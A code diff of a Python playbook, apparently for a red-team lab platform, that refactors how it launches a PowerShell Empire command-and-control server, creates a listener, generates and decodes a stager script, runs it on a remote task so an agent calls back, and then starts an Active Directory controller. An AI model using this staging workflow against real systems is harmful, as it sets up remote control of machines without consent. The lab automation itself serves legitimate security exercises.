@@ -87,42 +87,6 @@ def get_task_target_ip(tn):
     return task_target_ip
 
 
-# Poll the task_details until the task's status 'idle'.
-def get_task_status(tn):
-    task_status = None
-    task_details = None
-    while task_status != 'idle':
-        t.sleep(5)
-        task_details = h.get_task(tn)
-        task_status = task_details['task_status']
-    print(f'\n{tn} is ready:')
-    pp.pprint(task_details)
-    return task_details
-
-
-# A 'while loop' can be used to continually pull the results queue until the command results are returned.
-def get_command_results(tn, ic, ii, print_output=True):
-    results = []
-    command_finished = None
-    try:
-        while not command_finished:
-            command_results = h.get_task_results(tn)
-            if 'queue' in command_results:
-                for entry in command_results['queue']:
-                    if entry['instruct_command'] == ic and entry['instruct_instance'] == ii:
-                        command_finished = True
-                        if print_output:
-                            print(f'\n{tn} {ic} results:')
-                            pp.pprint(entry)
-                        results.append(entry)
-            if not command_finished:
-                t.sleep(5)
-    except KeyboardInterrupt:
-        print('get_command_results interrupted. Initiating clean_up.')
-        clean_up()
-    return results
-
-
 def clean_up():
     if ad_server_exists:
         print(f'Killing AD DC on {ad_server_exists[0]}')
@@ -142,19 +106,8 @@ def clean_up():
     if task_exists:
         # Kill the task.
         print(f'\nKilling task with name {task_exists}.')
-        instruct_instance = 'clean_up'
-        instruct_command = 'terminate'
-        h.instruct_task(task_exists, instruct_instance, instruct_command)
-        command_finished = None
-        while not command_finished:
-            kill_task_results = h.get_task_results(task_exists)
-            if 'queue' in kill_task_results:
-                for entry in kill_task_results['queue']:
-                    if entry['instruct_command'] == instruct_command and entry['instruct_instance'] == instruct_instance:
-                        print('Task terminated.')
-                        command_finished = True
-            if not command_finished:
-                t.sleep(5)
+        h.task_shutdown(task_exists)
+        t.sleep(5)
 
     if stager_exists:
         # Delete the stager file from the workspace.
@@ -205,15 +158,15 @@ if domain_name == 'None':
 else:
     task_host_name = resource_name
 print(f'\nLaunching powershell_empire task with name {task_name}.')
-h.run_task(
-    task_name, 'powershell_empire', task_host_name=task_host_name, task_domain_name=domain_name, portgroups=portgroups
+c2_task = h.task_startup(
+    task_name,
+    'powershell_empire',
+    task_host_name=task_host_name,
+    task_domain_name=domain_name,
+    portgroups=portgroups
 )
 task_exists = task_name
-
-# Wait for the powershell_empire task to become ready.
-print(f'\nWaiting for powershell_empire task {task_name} to become ready.')
-c2_task_status = get_task_status(task_name)
-c2_ip = c2_task_status['attack_ip']
+c2_ip = c2_task['attack_ip']
 print(f'\nThe powershell_empire task is ready with the following parameters:')
 print(f'\nIP - {c2_ip}')
 print(f'\nHost name - {task_host_name}')
@@ -231,18 +184,12 @@ if listener_tls == 'yes':
         subj = re.sub('\$HOST', f'{c2_ip}', cert_subj)
     instruct_command = 'cert_gen'
     instruct_args = {'subj': subj}
-    h.instruct_task(task_name, c2_instruct_instance, instruct_command, instruct_args)
-
-    # Get the cert_gen command results
-    cert_gen_results = get_command_results(task_name, instruct_command, c2_instruct_instance)
-    for cg_result in cert_gen_results:
-        if cg_result['instruct_command'] == instruct_command and cg_result['instruct_instance'] == c2_instruct_instance:
-            instruct_command_output = json.loads(cg_result['instruct_command_output'])
-            if instruct_command_output['outcome'] == 'success':
-                print('\ncert_gen succeeded.\n')
-            else:
-                print('\ncert_gen failed... Exiting.\n')
-                clean_up()
+    cert_gen = h.interact_with_task(task_name, c2_instruct_instance, instruct_command, instruct_args)
+    if cert_gen['outcome'] == 'success':
+        print('\ncert_gen succeeded.\n')
+    else:
+        print('\ncert_gen failed... Exiting.\n')
+        clean_up()
 
 # Create a listener for the powershell_empire task.
 print(f'\nCreating {resource_name} listener on {task_name} task.')
@@ -265,18 +212,12 @@ if listener_type == 'http_malleable' and listener_profile != 'None':
     instruct_args['Profile'] = f'{listener_profile}.profile'
 if listener_tls == 'yes':
     instruct_args['CertPath'] = '/opt/Empire/empire/server/data/'
-h.instruct_task(task_name, c2_instruct_instance, instruct_command, instruct_args)
-
-# Get the create_listener command results.
-create_listener_results = get_command_results(task_name, instruct_command, c2_instruct_instance)
-for cl_result in create_listener_results:
-    if cl_result['instruct_command'] == instruct_command and cl_result['instruct_instance'] == c2_instruct_instance:
-        instruct_command_output = json.loads(cl_result['instruct_command_output'])
-        if instruct_command_output['outcome'] == 'success':
-            print('\ncreate_listener succeeded.\n')
-        else:
-            print('\ncreate_listener failed... Exiting.\n')
-            clean_up()
+create_listener = h.interact_with_task(task_name, c2_instruct_instance, instruct_command, instruct_args)
+if create_listener['outcome'] == 'success':
+    print('\ncreate_listener succeeded.\n')
+else:
+    print('\ncreate_listener failed... Exiting.\n')
+    clean_up()
 
 # Generate a stager for the listener.
 print(f'\nGenerating a stager for the {resource_name} listener.')
@@ -287,19 +228,13 @@ instruct_args = {
     'Language': 'python',
     'OutFile': f'{resource_name}.sh'
 }
-h.instruct_task(task_name, c2_instruct_instance, instruct_command, instruct_args)
-
-# Get the create_stager command results.
-stager = get_command_results(task_name, instruct_command, c2_instruct_instance)
-for s in stager:
-    if s['instruct_command'] == instruct_command and s['instruct_instance'] == c2_instruct_instance:
-        instruct_command_output = json.loads(s['instruct_command_output'])
-        if instruct_command_output['outcome'] == 'success':
-            print('\ncreate_stager succeeded.\n')
-        else:
-            print('\ncreate_stager failed... Exiting.\n')
-            clean_up()
-output = json.loads(stager[0]['instruct_command_output'])['stager']['multi/launcher']['Output']
+stager = h.interact_with_task(task_name, c2_instruct_instance, instruct_command, instruct_args)
+if stager['outcome'] == 'success':
+    print('\ncreate_stager succeeded.\n')
+else:
+    print('\ncreate_stager failed... Exiting.\n')
+    clean_up()
+output = stager['stager']['multi/launcher']['Output']
 subprocess.call(f'echo {output} | base64 -d > {resource_name}.sh', shell=True)
 
 # Upload the stager file to the shared workspace
@@ -316,58 +251,48 @@ c2_agent_instruct_instance = ''.join(random.choice(string.ascii_letters) for i i
 print(f'\nDeleting any existing {resource_name}.sh stager from remote trainman task {remote_c2_agent_task_name}.')
 instruct_command = 'del'
 instruct_args = {'file_name': f'{resource_name}.sh'}
-h.instruct_task(remote_c2_agent_task_name, c2_agent_instruct_instance, instruct_command, instruct_args)
-
-# Get the del command results.
-del_results = get_command_results(remote_c2_agent_task_name, instruct_command, c2_agent_instruct_instance)
-for del_result in del_results:
-    if del_result['instruct_command'] == instruct_command and del_result['instruct_instance'] == c2_agent_instruct_instance:
-        instruct_command_output = json.loads(del_result['instruct_command_output'])
-        if instruct_command_output['outcome'] == 'success':
-            print('\nFile delete request succeeded.\n')
-        else:
-            print('\nNo existing file was present. Proceeding...\n')
+delete = h.interact_with_task(remote_c2_agent_task_name, c2_agent_instruct_instance, instruct_command, instruct_args)
+if delete['outcome'] == 'success':
+    print('\nFile delete request succeeded.\n')
+else:
+    print('\nNo existing file was present. Proceeding...\n')
 
 # Ask the trainman task to sync it's local workspace from the shared workspace.
 print(f'\nDownloading stager file from shared workspace to {remote_c2_agent_task_name} task local workspace.')
 instruct_command = 'sync_from_workspace'
-h.instruct_task(remote_c2_agent_task_name, c2_agent_instruct_instance, instruct_command)
-
-# Get the sync_workspace command results.
-sync_workspace_results = get_command_results(remote_c2_agent_task_name, instruct_command, c2_agent_instruct_instance)
-for sw_result in sync_workspace_results:
-    if sw_result['instruct_command'] == instruct_command and sw_result['instruct_instance'] == c2_agent_instruct_instance:
-        instruct_command_output = json.loads(sw_result['instruct_command_output'])
-        if instruct_command_output['outcome'] == 'success':
-            print('\nsync_from_workspace succeeded.\n')
-        else:
-            print('\nsync_from_workspace failed... Exiting.\n')
-            clean_up()
+sync_workspace = h.interact_with_task(remote_c2_agent_task_name, c2_agent_instruct_instance, instruct_command)
+if sync_workspace['outcome'] == 'success':
+    print('\nsync_from_workspace succeeded.\n')
+else:
+    print('\nsync_from_workspace failed... Exiting.\n')
+    clean_up()
 
 # Ask the trainman task to execute the stager file.
-print(f'\nInstructing remote trainman task {remote_c2_agent_task_name} to execute stager {resource_name}.sh.')
+print(f'\nInstructing remote trainman task {remote_c2_agent_task_name} to execute {resource_name}.sh as a process.')
 instruct_command = 'execute_process'
 instruct_args = {'file_path': f'/opt/havoc/shared/{resource_name}.sh'}
-h.instruct_task(remote_c2_agent_task_name, c2_agent_instruct_instance, instruct_command, instruct_args)
+execute_process = h.interact_with_task(
+    remote_c2_agent_task_name,
+    c2_agent_instruct_instance,
+    instruct_command,
+    instruct_args
+)
+if execute_process['outcome'] == 'success':
+    print('\nexecute_process request succeeded.\n')
+else:
+    print('\nexecute_process request failed... Exiting.\n')
+    clean_up()
 
-# Get the execute_process command results.
-execute_process_results = get_command_results(remote_c2_agent_task_name, instruct_command, c2_agent_instruct_instance)
-for ep_result in execute_process_results:
-    if ep_result['instruct_command'] == instruct_command and ep_result['instruct_instance'] == c2_agent_instruct_instance:
-        instruct_command_output = json.loads(ep_result['instruct_command_output'])
-        if instruct_command_output['outcome'] == 'success':
-            print('\nexecute_process request succeeded.\n')
-        else:
-            print('\nexecute_process request failed... Exiting.\n')
-            clean_up()
-
-# Use a random string for the agent instruct_instance.
-agent_instruct_instance = ''.join(random.choice(string.ascii_letters) for i in range(6))
-
+# Wait for the agent to connect.
 print(f'\nWaiting for an agent connection on task {task_name}.\n')
-agents = get_command_results(task_name, 'agent_status_monitor', 'agent_status_monitor')
-agent_name = json.loads(agents[0]['instruct_command_output'])['agent_info']['name']
-agent_exists = [agent_name, agent_instruct_instance, remote_c2_agent_task_name]
+try:
+    wait_for_c2_response = h.wait_for_c2(task_name)
+    agent_name = wait_for_c2_response['agent_info']['name']
+    agent_exists = [agent_name, c2_agent_instruct_instance, remote_c2_agent_task_name]
+    print(f'Agent connected with name {agent_name}\n')
+except KeyboardInterrupt:
+    print('Wait for agent operation interrupted. No agent connected. Exiting...')
+    clean_up()
 
 # Start an AD DC on the remote_ad_task
 # Use a random string for the remote_ad_task instruct_instance.
@@ -383,19 +308,13 @@ instruct_args = {
     'user_password': user_password,
     'admin_password': admin_password
 }
-h.instruct_task(remote_ad_task_name, ad_instruct_instance, instruct_command, instruct_args)
-
-# Get the run_ad_dc command results.
-run_ad_dc_results = get_command_results(remote_ad_task_name, instruct_command, ad_instruct_instance)
-for dc_result in run_ad_dc_results:
-    if dc_result['instruct_command'] == instruct_command and dc_result['instruct_instance'] == ad_instruct_instance:
-        instruct_command_output = json.loads(dc_result['instruct_command_output'])
-        if instruct_command_output['outcome'] == 'success':
-            print('\nrun_ad_dc succeeded.\n')
-            ad_server_exists = [remote_ad_task_name, ad_instruct_instance]
-        else:
-            print('\nrun_ad_dc failed.\n')
-            clean_up()
+run_ad_dc = h.interact_with_task(remote_ad_task_name, ad_instruct_instance, instruct_command, instruct_args)
+if run_ad_dc['outcome'] == 'success':
+    print('\nrun_ad_dc succeeded.\n')
+    ad_server_exists = [remote_ad_task_name, ad_instruct_instance]
+else:
+    print('\nrun_ad_dc failed.\n')
+    clean_up()
 
 print('\nAn AD DC server is running and an agent is connected. Playbook will halt until prompted to clean up.')
 print('\nPress enter to proceed with clean up.')
